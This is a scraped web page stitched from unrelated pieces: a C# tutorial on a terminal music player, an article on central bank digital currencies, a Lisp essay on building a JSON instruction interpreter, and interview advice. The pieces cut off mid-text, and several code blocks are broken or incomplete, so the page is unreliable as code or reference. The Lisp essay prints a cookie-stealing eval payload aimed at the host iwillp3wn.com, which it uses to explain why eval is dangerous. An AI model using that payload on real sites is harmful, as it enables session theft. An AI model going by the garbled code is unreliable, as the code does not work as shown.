<p>Moreover, I also wanted to make sure that I made use of Test Driven Development and code linting within the project. For this project, I’m making use of Stylecop to enfore proper code style. For the curious, you can view the entire MusicSharp code repository in its current state <a href="https://github.com/markjamesm/MusicSharp" target="_blank">on Github</a>. I highly recommend following the repo to keep up to date with the latest commits (and a star wouldn’t be too bad either :-P)!</p>

<h2 id="getting-started">Getting Started</h2>

<p>Armed with a name and an idea, the next thing I needed was to settle on was which C# libraries I would use to implement the UI and audio functionality. After doing some research, I decided that the optimal solution would be to use <a href="https://github.com/migueldeicaza/gui.cs" target="_blank">Terminal.Gui</a> for the UI elements and <a href="https://github.com/naudio/NAudio" target="_blank">NAudio</a> to handle the audio side of things. Created by Miuel de Icaza (the creator of Mono and Xamarin), Terminal.Gui is a cross-platform library for building console-based applications that work on monochrome terminals as well as modern terminals with mouse support. Leveraging Termnial.Gui to build the UI, I chose NAudio to handle the audio playing capabilities of MusicSharp as its a mature C# library.</p>

<h2 id="mocking-up-a-simple-ui">Mocking up a simple UI</h2>

<p>With some of the preliminary items out of the way, my next step was to work on some wireframe mockups to see what kind of UI I might want to create. I’ve used a lot of music players over my life (including CLI ones), and so I have a good idea of what music players should have. Slowly, I started breaking down the different elements I thought would need and came up with the following:</p>

<ul>
  <li>A menu bar</li>
  <li>A status bar</li>
  <li>A player section (with associated controls)</li>
  <li>A playlist browser</li>
</ul>

<p>I sketched out a few different UI layouts until I came up with the following which I felt would work for a first iteration:</p>

<p><img src="https://markjames.dev/img/posts/music-sharp/MusicSharp-ui-mockup.png" alt="MusicSharp UI Mockup" title="MusicSharp UI mockup"></p>

<h2 id="building-the-main-window">Building the Main Window</h2>

<p>Mockup in hand, I started diving into the Terminal.gui API docs in order to build my first window. I created a new Gui class in a file called Gui.cs with a method named Start(). Inside the Start method, I initialized Terminal.Gui and created a simple top-level window. Note that</p>

<div><div><pre><code><span>namespace</span> <span>MusicSharp</span>
<span>{</span>
    <span>using</span> <span>Terminal.Gui</span><span>;</span>

    <span>/// &lt;summary&gt;</span>
    <span>/// The Gui class houses the CLI elements of MusicSharp.</span>
    <span>/// &lt;/summary&gt;</span>
    <span>public</span> <span>class</span> <span>Gui</span>
    <span>{</span>
        <span>/// &lt;summary&gt;</span>
        <span>/// The Start method builds the user interface.</span>
        <span>/// &lt;/summary&gt;</span>
        <span>public</span> <span>void</span> <span>Start</span><span>()</span>
        <span>{</span>
            <span>// Creates a instance of MainLoop to process input events, handle timers and other sources of data.</span>
            <span>Application</span><span>.</span><span>Init</span><span>();</span>

            <span>var</span> <span>top</span> <span>=</span> <span>Application</span><span>.</span><span>Top</span><span>;</span>
            <span>var</span> <span>tframe</span> <span>=</span> <span>top</span><span>.</span><span>Frame</span><span>;</span>

            <span>// Create the top-level window.</span>
            <span>var</span> <span>win</span> <span>=</span> <span>new</span> <span>Window</span><span>(</span><span>"MusicSharp"</span><span>)</span>
            <span>{</span>
                <span>X</span> <span>=</span> <span>0</span><span>,</span>
                <span>Y</span> <span>=</span> <span>1</span><span>,</span> <span>// Leave one row for the toplevel menu</span>

                <span>// By using Dim.Fill(), it will automatically resize without manual intervention</span>
                <span>Width</span> <span>=</span> <span>Dim</span><span>.</span><span>Fill</span><span>(),</span>

                <span>// Subtract one row for the statusbar</span>
                <span>Height</span> <span>=</span> <span>Dim</span><span>.</span><span>Fill</span><span>()</span> <span>-</span> <span>1</span><span>,</span>
            <span>};</span>
            <span>});</span>

            <span>// Add the layout elements and run the app.</span>
            <span>top</span><span>.</span><span>Add</span><span>(</span><span>win</span><span>);</span>
            <span>Application</span><span>.</span><span>Run</span><span>();</span>
        <span>}</span>
    <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>Inside my Program.cs file, I called the Start method like so:</p>

<div><div><pre><code>    <span>public</span> <span>static</span> <span>void</span> <span>Main</span><span>()</span>
    <span>{</span>
        <span>// Start MusicSharp.</span>
        <span>Gui</span> <span>gui</span> <span>=</span> <span>new</span> <span>Gui</span><span>();</span>
        <span>gui</span><span>.</span><span>Start</span><span>();</span>
    <span>}</span>
</code></pre></div></div>

<p>Running the program in this state produced the following result:</p>

<p><img src="https://markjames.dev/img/posts/music-sharp/MusicSharp-first-build.png" alt="MusicSharp first build screenshot" title="MusicSharp first build screenshot"></p>

<p>Success! We now have a top level window which dynamically resizes while leaving space on the top and bottom of the screen for statusbars.</p>



<p>The next step was to implement a top level menu, and fortunately this was easy to do with Terminal.Gui. Just aboce top.Add(win), I created the following code:</p>

<div><div><pre><code><span>// Create the menubar.</span>
<span>var</span> <span>menu</span> <span>=</span> <span>new</span> <span>MenuBar</span><span>(</span><span>new</span> <span>MenuBarItem</span><span>[]</span>
<span>{</span>
    <span>new</span> <span>MenuBarItem</span><span>(</span><span>"_File"</span><span>,</span> <span>new</span> <span>MenuItem</span><span>[]</span>
    <span>{</span>
        <span>new</span> <span>MenuItem</span><span>(</span><span>"_Open"</span><span>,</span> <span>"Open a music file"</span><span>,</span> <span>()</span> <span>=&gt;</span> <span>Application</span><span>.</span><span>RequestStop</span><span>()),</span>

        <span>new</span> <span>MenuItem</span><span>(</span><span>"_Open Stream"</span><span>,</span> <span>"Open a stream"</span><span>,</span> <span>()</span> <span>=&gt;</span> <span>Application</span><span>.</span><span>RequestStop</span><span>()),</span>

        <span>new</span> <span>MenuItem</span><span>(</span><span>"_Quit"</span><span>,</span> <span>"Exit MusicSharp"</span><span>,</span> <span>()</span> <span>=&gt;</span> <span>Application</span><span>.</span><span>RequestStop</span><span>()),</span>
    <span>}),</span>

    <span>new</span> <span>MenuBarItem</span><span>(</span><span>"_Help"</span><span>,</span> <span>new</span> <span>MenuItem</span><span>[]</span>
    <span>{</span>
        <span>new</span> <span>MenuItem</span><span>(</span><span>"_About"</span><span>,</span> <span>string</span><span>.</span><span>Empty</span><span>,</span> <span>()</span> <span>=&gt;</span>
        <span>{</span>
            <span>MessageBox</span><span>.</span><span>Query</span><span>(</span><span>"Music Sharp 0.2.0"</span><span>,</span> <span>"\nMusic Sharp is a lightweight CLI\n music player written in C#.\n\nDeveloped by Mark-James McDougall\nand licensed under the GPL v3.\n "</span><span>,</span> <span>"Close"</span><span>);</span>
        <span>}),</span>
    <span>}),</span>
<span>});</span>
</code></pre></div></div>

<p>Here, I did a few things. Firstly, I created a new MenuBar which will house the Menu Bar Items. Next, I created each menu item (File and Help), and populated them with handy child items that we’ll need in our UI. These children take a name, optional descriptor, and a method as arguments, and for now I’m calling Application.RequestStop() on each of them to exit the application (Later I’ll be replacing these with the actual methods once I write them). In addition, I also created a simple about dialog box as a way to familiarize myself with Terminal.Gui. Compiling our code up to this point produces the following menu:</p>

<p><img src="https://markjames.dev/img/posts/music-sharp/MusicSharp-menu.png" alt="Screenshot of the MusicSharp menu bar" title="Screenshot of the MusicSharp menu bar"></p>

<p>And a neat looking about dialog:</p>

<p><img src="https://markjames.dev/img/posts/music-sharp/MusicSharp-about-dialog.png" alt="Screenshot of the MusicSharp about dialog" title="Screenshot of the MusicSharp about dialog"></p>

<p>Although I still need to add some additional menu items (such as save/load playlist functionality), this gives us a great jumping off point for the next part, getting basic audio functionality working!</p>

<h2 id="playing-audio">Playing Audio</h2>

<p>Now that a very simple UI had been created, my next order of business was to test out NAudio and see how I could play an MP3 file as a simple proof of concept. In order to do so, I created a new file called Player.cs to house the audio playing related functions.</p>

<p>Inside the Player class, I created a PlayAudioFile() method which read an MP3 file from a static location on my PC and then played it using NAudio. The code looked like this:</p>

<div><div><pre><code><span>/// &lt;summary&gt;</span>
<span>/// The Player class handles audio playback.</span>
<span>/// &lt;/summary&gt;</span>
<span>public</span> <span>static</span> <span>class</span> <span>Player</span>
<span>{</span>
    <span>/// &lt;summary&gt;</span>
    <span>/// Method that implements audio playback from a file.</span>
    <span>/// &lt;/summary&gt;</span>
    <span>public</span> <span>static</span> <span>void</span> <span>PlayAudioFile</span><span>()</span>
    <span>{</span>
        <span>string</span> <span>file</span> <span>=</span> <span>@"C:\MusicSharp\Zhund-Dusty.mp3"</span><span>;</span>

        <span>// Load the audio file and select an output device.</span>
        <span>using</span> <span>var</span> <span>audioFile</span> <span>=</span> <span>new</span> <span>AudioFileReader</span><span>(</span><span>file</span><span>);</span>
        <span>using</span> <span>var</span> <span>outputDevice</span> <span>=</span> <span>new</span> <span>WaveOutEvent</span><span>();</span>

        <span>outputDevice</span><span>.</span><span>Init</span><span>(</span><span>audioFile</span><span>);</span>
        <span>outputDevice</span><span>.</span><span>Play</span><span>();</span>

        <span>// Sleep until playback is finished.</span>
        <span>while</span> <span>(</span><span>outputDevice</span><span>.</span><span>PlaybackState</span> <span>==</span> <span>PlaybackState</span><span>.</span><span>Playing</span><span>)</span>
        <span>{</span>
            <span>Thread</span><span>.</span><span>Sleep</span><span>(</span><span>1000</span><span>);</span>
        <span>}</span>
    <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>The last order of business was to wire up the PlayAudioFile() method to the UI, and I did so by replacing the Open menu line of code in Gui.cs to the following:</p>

<div><div><pre><code><span>new</span> <span>MenuItem</span><span>(</span><span>"_Open"</span><span>,</span> <span>"Open a music file"</span><span>,</span> <span>()</span> <span>=&gt;</span> <span>Player</span><span>.</span><span>PlayAudioFile</span><span>()),</span>
</code></pre></div></div>

<p>After compiling and opening the player, I was now greeted with the sweet sounds of music! Although it was exciting to hear music this early on, there were quite a few catches however. These included:</p>

<ul>
  <li>No exception handling if the MP3 file is missing</li>
  <li>No way to load other music files</li>
  <li>Missing playback controls and volume</li>
  <li>Playback status indicator</li>
</ul>

<p>Although these features were missing, I still find it quite exciting whenever I’m able to make tangible progress in a project and it provides some motivation to work through some of the more tedious parts.</p>



<p>In Part One of this guide, we learned how to implement a simple UI using Terminal.Gui and then use it to play an audio file with NAudio. I would have liked to make MusicSharp cross-platform, but unfortunately According to NAudio creator <a href="https://markjames.dev/2020-10-25-developing-a-cli-music-player-csharp/Mark%20Heath" target="_blank">Mark Heath</a>, “A large part of the [NAudio] codebase consists of P/Invoke or COM interop wrappers around the various Windows audio APIs. So even if a .NET Standard build were to be created, much of the functionality would fail to work if you tried to use it in a .NET Core app running on Linux.”.</p>

<p>Curious, I tested MusicSharp on my Macbook Pro (running Catalina) and the program ran but crashed once I tried to open an MP3:</p>

<p><img src="https://markjames.dev/img/posts/music-sharp/MusicSharp-macOS-Catalina.png" alt="MusicSharp first build running on macOS Catalina" title="MusicSharp first build running on macOS Catalina"></p>

<p>In these early stages of testing, MusicSharp is currently consuming 15mb of memory and negligible CPU usage while running in debug mode, and it’ll be interesting to see where the performance numbers end up as the player functionality gets more fleshed out. Be sure to stay tuned for part two of this guide, as we will refactor our current code to make it easier to test and more loosely coupled using Interfaces and Dependency Injection!</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div href=""><p>Central banks have overseen monetary policy for much of the last century. During that time, competition was scarce and innovation was slow.</p><p>But in the last decade, a three-pronged attack on the status quo has forced central banks to re-think their strategy.</p><p>It started when Bitcoin bypassed the entire global financial system with a digital, trustless payment network. It gave anyone the power to store, send and receive money across scale, space, and time.</p><p>Then, crypto stablecoins emerged as digital versions of fiat money on new payment rails, giving anyone with an internet connection access to their fiat currency of choice with no borders or transaction limits.</p><p>And in the last decade, a wave of digital-first financial apps like WeChat and Cash App have started to eat away at banking oligopolies, raising the bar for what people expect from their financial institutions.</p><p>In short, the entire global money supply chain is being disrupted, and nothing is exempt.</p><p>Not central banks, not local bank branches, not even the cash in your pocket.</p><p>In response, every segment of the traditional financial system is adapting. Banks are moving operations online and closing branches, merchants are improving online and in-person payment options, and central banks are studying digital currencies.</p><p>In this article we'll cover:</p><ul role="list"><li>What Central Bank Digital Currencies (CBDCs) are</li><li>Which countries are working on CBDCs</li><li>Why digital currencies are important tools for central banks</li><li>The impact CBDCs may have on commercial banks and physical cash</li><li>The challenges central banks need to overcome to implement a CBDC</li></ul><h2>What are Central Bank Digital Currencies?</h2><p>Central Bank Digital Currencies (CBDCs) are a digital extension of the cash in your pocket. There are a few important differences between CBDCs and cash, but 'digital cash' is a good starting point.</p><p>To understand what might make a 'digital cash' useful, let's start with the features that make cash useful. Because for decades, people all over the world have chosen cash as their preferred tool for buying and selling all sorts of goods and services. Why?</p><p>Cash has a few characteristics that make everyday payments possible:</p><ul role="list"><li>Everyone accepts it</li><li>It is hard to counterfeit</li><li>It can be exchanged directly (without involving a bank, payment processor, or government)</li><li>Settlement is instant and final (when I give you cash, all of it instantly becomes yours)</li><li>There are no minimum or maximum purchase amounts and no withholding periods</li></ul><p>But in addition to the features above, cash also has downsides for people and governments.</p><p>For people:</p><ul role="list"><li>It can't be spent online</li><li>It's awkward to store and manage coins and bills of all shapes and sizes</li><li>It's dirty (an especially significant concern thanks to COVID)</li><li>Holding large amounts of cash requires extra security</li></ul><p>For governments:</p><ul role="list"><li>It hides transactions and makes it hard to track down illegal purchases</li><li>It makes it harder to correctly account for and collect taxes</li><li>It's not an effective way to move large sums of money</li><li>It's not an effective way to send (or receive) money to (or from) millions of citizens</li></ul><p>Some of the disadvantages of cash can be easily solved with credit cards and wire transfers, but those are specialized (and expensive) financial tools with their own sets of problems. That's not the point of a CBDC.</p><p>At a high level, central bankers know that cash usage is declining, but they also know how important it is to a functioning economy. So they're trying to build a stable and versatile digital currency that is just as accessible as cash, without the physical constraints of coins and bills.</p><h2>Who is Working on CBDCs?</h2><p>A handful of central banks have already started working on CBDCs.</p><p>China was the first to act, possibly motivated by the prospect of achieving 'global reserve' currency status.</p><p>By launching a 'digital yuan' CBDC before the US launches a 'digital dollar' CBDC, China may be hoping to get other countries to trade in Yuan-denominated digital currency, rather than dollar-denominated money on traditional payment rails.</p><p>For a US economy that accounts for just 23% of global GDP, <a href="https://www.investopedia.com/articles/forex-currencies/092316/how-us-dollar-became-worlds-reserve-currency.asp#:~:text=Present%20Day-,Today%2C%20more%20than%2061%25%20of%20all%20foreign%20bank%20reserves%20are,debt%20is%20denominated%20in%20dollars.">61% of all foreign bank reserves</a> are currently denominated in U.S. dollars, and <a href="https://www.investopedia.com/articles/forex-currencies/092316/how-us-dollar-became-worlds-reserve-currency.asp#:~:text=Present%20Day-,Today%2C%20more%20than%2061%25%20of%20all%20foreign%20bank%20reserves%20are,debt%20is%20denominated%20in%20dollars.">40% of the world's debt</a> is denominated in dollars.</p><p>This 'dollarization of the world' has given America access to a massive pool of buyers for their debt, at lower rates than would be possible without being a 'reserve currency'.</p><p>Not an advantage the US wants to give up.</p><p>In 2015, The US Federal Reserve initially dismissed the idea of a digital currency, but has since changed their tune. They are actively researching the idea of a digital currency, along with a handful of other central banks around the world.</p><p>Below is a list of central banks that have made public statements about digital currencies, and the progress they've made so far.</p><h3>China</h3><ul role="list"><li><a

central banks released a paper titled <a href="https://www.bis.org/publ/othp33.pdf">'Central bank digital currencies: foundational principles and core features'</a>.</p><p>So far, it's the most complete CBDC plan central banks have released, and it's a common framework that they all worked together on.</p><p>Participants included the Bank of Canada, the ECB, the Bank of Japan, the Swedish Central Bank, the Swiss National Bank, the Bank of England, and the US Federal Reserve. It's worth noting that China did not collaborate on this report, and seems to be content building their own system.</p><p>The report above explains why central banks are studying digital currencies, and what a central bank digital currency might look like if it were to be implemented. It also emphasizes that none of the seven central banks are ready to implement a CBDC yet.</p><p>Below are some of the motivations, potential use cases, and challenges that were highlighted in the CBDC report.</p><h3>Opportunities for Central Bank Digital Currencies</h3><ul role="list"><li>Decreasing cash usage means some people (often the least wealthy) are left without access to 'risk-free' forms of payment</li><li>A CBDC could become a back-up payment method in extreme situations or remote locations where cash might not be accessible</li><li>A fragmented financial payment system with many competing 'closed-loop' participants (banks, credit cards, payment processors) could limit economic growth, a common CBDC could open up better payments access for all</li><li>A global CBDC framework could radically improve cross-border payments</li><li>Central banks could use a CBDC to instantly send stimulus money directly to citizens and governments could collect on taxes just as easily</li><li>Central banks could pay people interest on their CBDC holdings, just like a regular bank might have <a href="https://www.kevinrooke.com/post/your-bank-account-pays-negative-interest">(before they started paying negative interest rates)</a></li></ul><h3>Challenges for Central Bank Digital Currencies</h3><ul role="list"><li>How can central banks build a currency offering instant payments that is also hard to counterfeit, safe from cyber-attacks, and available at all times (including when the internet goes down)?</li><li>How will central banks make sure that technology-illiterate and low-income earners can onboard themselves to a completely digital system?</li><li>How will central banks convince people to trust a digital payments system that can track all of their transactions?</li><li>How will central banks create or connect an existing digital identity system to be sure that money is being sent to and received from the right people?</li><li>If central banks start paying people interest directly through a CBDC, will people ditch their bank accounts? Could this lead to runs on banks or other financial disruptions?</li><li>Could digital currencies undermine the effectiveness of foreign central bank monetary policy? Ex.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p><span><p>Every lisp hacker I ever met, myself included, thought that all those brackets in Lisp were off-putting and weird. At first, of course. Soon after we all came to the same epiphany: <em>lisp’s power lies in those brackets</em>! In this essay, we’ll go on a journey to that epiphany.</p><p>Say we were creating a program that let you draw stuff. If we wrote this in JavaScript, we might have functions like this:</p><pre><code><span>drawPoint</span><span>({x: </span><span>0</span><span>, y: </span><span>1</span><span>}, </span><span>'yellow'</span><span>)</span>
<span>drawLine</span><span>({x: </span><span>0</span><span>, y: </span><span>0</span><span>}, {x: </span><span>1</span><span>, y: </span><span>1</span><span>}, </span><span>'blue'</span><span>)</span>
<span>drawCircle</span><span>(</span><span>point</span><span>, </span><span>radius</span><span>, </span><span>'red'</span><span>)</span>
<span>rotate</span><span>(</span><span>shape</span><span>, </span><span>90</span><span>)</span>
<span>...</span></code></pre><p>So far, so cool.</p><p>Now, here’s a challenge: <strong>Can we support remote drawing?</strong></p><p>This means that a user would be able to “send” instructions to your screen, and you would see their drawing come to life.</p><p>How could we do it?</p><p>Well, say we set up a websocket connection. We could receive instructions from the user like this: </p><pre><code><span>websocket</span><span>.onMessage</span><span>(</span><span>data</span><span> </span><span>=&gt;</span><span> { </span>
<span>  </span><span>/* TODO */</span><span> </span>
<span>})</span></code></pre><p>To make it work off the bat, one option could be to take code strings as input:</p><pre><code><span>websocket</span><span>.onMessage</span><span>(</span><span>data</span><span> </span><span>=&gt;</span><span> {</span>
<span>  </span><span>eval</span><span>(</span><span>data</span><span>)</span>
<span>})</span></code></pre><p>Now the user could send <code>"drawLine({x: 0, y: 0}, {x: 1, y: 1}, 'red')"</code> and bam: we’ll draw a line! </p><p>But…your spidey sense may already be tingling. What if the user was malicious and managed to send us an instruction like this:</p><pre><code><span>"window.location='http://iwillp3wn.com?user_info=' + document.cookie"</span></code></pre><p>Uh oh…our cookie would get sent to iwillp3wn.com, and the malicious user would indeed pwn us. We can’t use eval; it’s too dangerous. </p><p>There lies our problem: we can’t use <code>eval</code>, but we need some way to receive arbitrary instructions.</p><p>Well, we could represent those instructions as JSON. We can map each JSON instruction to a special function, and that way we can control what runs. Here’s one way we can represent it:</p><pre><code><span>{</span>
<span>  instructions: [</span>
<span>    { functionName: </span><span>"drawLine"</span><span>, args: [{ x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>1</span><span>, y: </span><span>1</span><span> }, </span><span>"blue"</span><span>] },</span>
<span>  ];</span>
<span>}</span></code></pre><p>This JSON would translate to <code>drawLine({x: 0, y: 0}, {x: 1, y: 1},"blue")</code></p><p>We could support this pretty simply. Here’s how our <code>onMessage</code> could look:</p><pre><code><span>webSocket</span><span>.onMessage</span><span>(</span><span>instruction</span><span> </span><span>=&gt;</span><span> { </span>
<span>  </span><span>const</span><span> </span><span>fns</span><span> </span><span>=</span><span> {</span>
<span>    drawLine: </span><span>drawLine</span><span>,</span>
<span>    </span><span>...</span>
<span>  };</span>
<span>  </span><span>data</span><span>.</span><span>instructions</span><span>.forEach</span><span>((</span><span>ins</span><span>) </span><span>=&gt;</span><span> </span><span>fns</span><span>[</span><span>ins</span><span>.</span><span>functionName</span><span>](</span><span>...</span><span>ins</span><span>.</span><span>args</span><span>));</span>
<span>})</span></code></pre><p>That seems like it would work!</p><p>Let’s see if we can clean this up. Here’s our JSON:</p><pre><code><span>{</span>
<span>  instructions: [</span>
<span>    { functionName: </span><span>"drawLine"</span><span>, args: [{ x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>1</span><span>, y: </span><span>1</span><span> }, </span><span>"blue"</span><span>] },</span>
<span>  ];</span>
<span>}</span></code></pre><p>Well, since <em>every</em> instruction has a <code>functionName</code>, and an <code>args</code>, we don’t really need to spell that out. We <em>could</em> write it like this: </p><pre><code><span>{</span>
<span>  instructions: [[</span><span>"drawLine"</span><span>, { x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>1</span><span>, y: </span><span>1</span><span> }, </span><span>"blue"</span><span>]],</span>
<span>}</span></code></pre><p>Nice! We changed our object in favor of an array. To handle that, all we need is a rule: <strong>the</strong> <strong><em>first</em></strong> <strong>part of our instruction is the function name, and the <em>rest</em> are arguments.</strong> If we wrote that down, here’s how our <code>onMessage</code> would look: </p><pre><code><span>websocket</span><span>.onMessage</span><span>(</span><span>data</span><span> </span><span>=&gt;</span><span> { </span>
<span>  </span><span>const</span><span> </span><span>fns</span><span> </span><span>=</span><span> {</span>
<span>    drawLine: </span><span>drawLine</span><span>,</span>
<span>    </span><span>...</span>
<span>  };</span>
<span>  </span><span>data</span><span>.</span><span>instructions</span><span>.forEach</span><span>(([</span><span>fName</span><span>, </span><span>...</span><span>args</span><span>]) </span><span>=&gt;</span><span> </span><span>fns</span><span>[</span><span>fName</span><span>](</span><span>...</span><span>args</span><span>));</span>
<span>})</span></code></pre><p>And bam, <code>drawLine</code> would work again!</p><p>So far, we only used <code>drawLine</code>:</p><pre><code><span>drawLine</span><span>({x: </span><span>0</span><span>, y: </span><span>0</span><span>}, {x: </span><span>1</span><span>, y: </span><span>1</span><span>}, </span><span>'blue'</span><span>)</span>
<span>// same as</span>
<span>[</span><span>"drawLine"</span><span>, { x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>1</span><span>, y: </span><span>1</span><span> }]</span></code></pre><p>But what if we wanted to express something more powerful:</p><pre><code><span>rotate</span><span>(</span><span>drawLine</span><span>({x: </span><span>0</span><span>, y: </span><span>0</span><span>}, {x: </span><span>1</span><span>, y: </span><span>1</span><span>}, </span><span>'blue'</span><span>), </span><span>90</span><span>)</span></code></pre><p>Looking at that, we can translate it to an instruction like this:</p><pre><code><span>[</span><span>"rotate"</span><span>, [</span><span>"drawLine"</span><span>, { x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>1</span><span>, y: </span><span>1</span><span> }], </span><span>90</span><span>]</span></code></pre><p>Here, the <code>rotate</code> instruction has an argument that is in <em>itself</em> an instruction! Pretty powerful. Surprisingly, we just need to tweak our code a tiny bit to make it work:</p><pre><code><span>websocket</span><span>.onMessage</span><span>(</span><span>data</span><span> </span><span>=&gt;</span><span> { </span>
<span>  </span><span>const</span><span> </span><span>fns</span><span> </span><span>=</span><span> {</span>
<span>    drawLine: </span><span>drawLine</span><span>,</span>
<span>    </span><span>...</span>
<span>  };</span>
<span>  </span><span>const</span><span> </span><span>parseInstruction</span><span> </span><span>=</span><span> (</span><span>ins</span><span>) </span><span>=&gt;</span><span> {</span>
<span>    </span><span>if</span><span> (</span><span>!</span><span>Array</span><span>.isArray</span><span>(</span><span>ins</span><span>)) {</span>
<span>      </span><span>// this must be a primitive argument, like {x: 0 y: 0}</span>
<span>      </span><span>return</span><span> </span><span>ins</span><span>;</span>
<span>    }</span>
<span>    </span><span>const</span><span> [</span><span>fName</span><span>, </span><span>...</span><span>args</span><span>] </span><span>=</span><span> </span><span>ins</span><span>;</span>

<span>  };</span>
<span>  </span><span>data</span><span>.</span><span>instructions</span><span>.forEach</span><span>(</span><span>parseInstruction</span><span>);</span>
<span>})</span></code></pre><p>Nice, We introduce a <code>parseInstruction</code> function. We can apply <code>parseInstruction</code> recursively to arguments, and support stuff like:</p><pre><code><span>[</span><span>"rotate"</span><span>, [</span><span>"rotate"</span><span>, [</span><span>"drawLine"</span><span>, { x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>1</span><span>, y: </span><span>1</span><span> }], </span><span>90</span><span>]]]</span></code></pre><p>Very cool!</p><p>Okay, let’s look at our JSON again:</p><pre><code><span>{</span>
<span>  instructions: [[</span><span>"drawLine"</span><span>, { x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>1</span><span>, y: </span><span>1</span><span> }]],</span>
<span>}</span></code></pre><p>Well, our data <em>only</em> contains instructions. Do we really need a key called <code>instructions</code>? </p><p>What if we did this: </p><pre><code><span>[</span><span>"do"</span><span>, [</span><span>"drawLine"</span><span>, { x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>1</span><span>, y: </span><span>1</span><span> }]]</span></code></pre><p>Instead of a top-level key, we could have a special instruction called <code>do</code>, which runs all the instructions it’s given.</p><p>Here’s one way we can implement it:</p><pre><code><span>websocket</span><span>.onMessage</span><span>(</span><span>data</span><span> </span><span>=&gt;</span><span> { </span>
<span>  </span><span>const</span><span> </span><span>fns</span><span> </span><span>=</span><span> {</span>

<span>  };</span>
<span>  </span><span>parseInstruction</span><span>(</span><span>instruction</span><span>);</span>
<span>})</span></code></pre><p>Oh wow, that was easy. We just added <code>do</code> in <code>fns</code>. Now we can support an instruction like this:</p><pre><code><span>[</span>

<span>};</span></code></pre><p>When we find a <code>fn</code>  instruction, we run <code>parseFnInstruction</code>. This produces a new javascript function.

<span>  color: </span><span>"blue"</span><span>, </span>

<span>      ],</span></code></pre><p>And run it through <code>parseInstruction</code>, with our <code>newVariables</code>. With that <code>"left"</code> would be looked up as a variable and map to <code>{x: 0, y: 0}</code>. </p><p>If we did that, voila, the major work to support functions would be done!</p><p>Let’s follow through on our plan. The first thing we need to do, is to have <code>parseInstruction</code> accept <code>variables</code> as an argument.

<span>  };</span>
<span>  </span><span>parseInstruction</span><span>(</span><span>instruction</span><span>, </span><span>variables</span><span>);</span></code></pre><p>Next, we’ll want to add a special check to detect if we have a “fn” instruction:</p><pre><code><span>  </span><span>const</span><span> </span><span>parseInstruction</span><span> </span><span>=</span><span> (</span><span>ins</span><span>, </span><span>variables</span><span>) </span><span>=&gt;</span><span> {</span>

	    	<p>When a hiring manager asks the weakness interview question, “What is your greatest weakness?” it’s best to be prepared with an answer. And a specific weakness in mind. This type of interview question is aimed at learning about a candidate’s core competencies in advance of hiring. Competencies are demonstrable characteristics and skills that improve a job's efficiency and effectiveness (or performance). These types of interview questions can help an employer predict the future job performance of a job candidate.</p>

<p>This common interview question comes in many forms. The interviewer may ask, “What is your biggest weakness?” or “What do you feel your greatest strength and weaknesses are?” When considering weaknesses to mention, it can be helpful to refer to a list of weaknesses that set examples for a potential answer. A job seeker should prepare to be asked this common interview question and prepare their answer with a real weakness they feel comfortable sharing.</p>

<p>This interview question is normally asked during the “on-site interview” portion of the interview process. It is less common for this question to be asked during the phone interview or pre-screen interview stage from a prospective employer. Regardless of the interview type, when there’s an upcoming interview, it is always suggested to prepare a “good answer” to this question and be ready to respond when asked this dreaded interview question.</p>

<p><img src="https://www.algrim.co/images/weaknesses-interview-question.jpg" alt="weaknesses interview question"></p>

<h2>Why "What Is Your Greatest Weakness" is Asked</h2>

<p>This interview question is asked to candidates to see how self-reflective they might be, how humble they might be, and if they have humility. The exercise aims to measure core competencies as well as the ability to be self-disciplined with their work.</p>

<p><strong>Tip:</strong> Keep seeing the phrase "core competencies?" Curious about what a core competency is? A core competency is a concept in management theory introduced by <a href="https://en.wikipedia.org/wiki/C._K._Prahalad">C. K. Prahalad</a> and <a href="https://en.wikipedia.org/wiki/Gary_Hamel">Gary Hamel</a>. It is defined as “a harmonized combination of multiple resources and skills that distinguish a firm in the marketplace.” And therefore, it is the foundation of a companies’ competitiveness.</p>

<p>When answering this interview question, the hiring manager doesn't care about what the candidate answers with, but how they answer it. The purpose of the exercise is for the employee to give themselves a small performance review.</p>

<p>According to <a href="https://www.bamboohr.com/hr-glossary/performance-review/">BambooHR</a>, "A performance review is a formal assessment in which a manager evaluates an employee's work performance, identifies strengths and weaknesses, offers feedback, and sets goals for future performance."</p>

<p>We can see from the interview question that it promotes the opportunity for the employee to be humble and identify a weakness that can be improved. When finding a weakness, use a weakness that is subtle. Rather, a strength that can be improved and not a weakness or missing talent.</p>

<p>For example, a great weakness would be <strong>patience</strong>. Since it is a strength, but can always be improved. Everyone can improve their patience. And patience will pay dividends for any business. It's a question that tests the candidate and shows whether or not they're a "good fit" for the business.</p>

<h2>Interview Question Answer Strategy</h2>

<p>The best strategy for answering this interview question is to answer with weaknesses that can also be considered strengths. Or another way to phrase it is to use a weakness that can be easily controlled or utilized in certain situations. Consider this a “good weakness.”</p>

<p>A poor weakness that does not do this is:</p>

<p>
I feel like I can get frustrated too easily.
</p>

<p>A good weakness that can be utilized as strength is:</p>

<p>
I can find myself having a hard time letting go of a project that I poured my heart into.
</p>

<p>This makes any weakness you describe an “acceptable” weakness to the interviewer or hiring manager. It also refers to a weakness that is presentable “on the job” rather than speaking about a personal weakness. For example, a personal weakness would be, “I feel like I get stressed out under pressure.” This is simply an irrelevant weakness to the hiring manager.</p>

<p>While many resources claim that referring to a <a href="https://www.algrim.co/879-skills-list-for-the-resume">soft skill</a> or hard skill through the interview answer is correct, it’s more effective to use a weakness that can be harnessed as a strength for the employer. There are two reasons for this. First, the interview answer will be more clear. Second, the story being told by the candidate will be shorter, and skill will still present itself to the hiring manager. The risk of using a story that describes a <a href="https://www.algrim.co/879-skills-list-for-the-resume">soft skill</a> is that it has the potential of mentioning a non-essential skill for the role. A clear, concise, and simple reference to the weakness should be sufficient.</p>

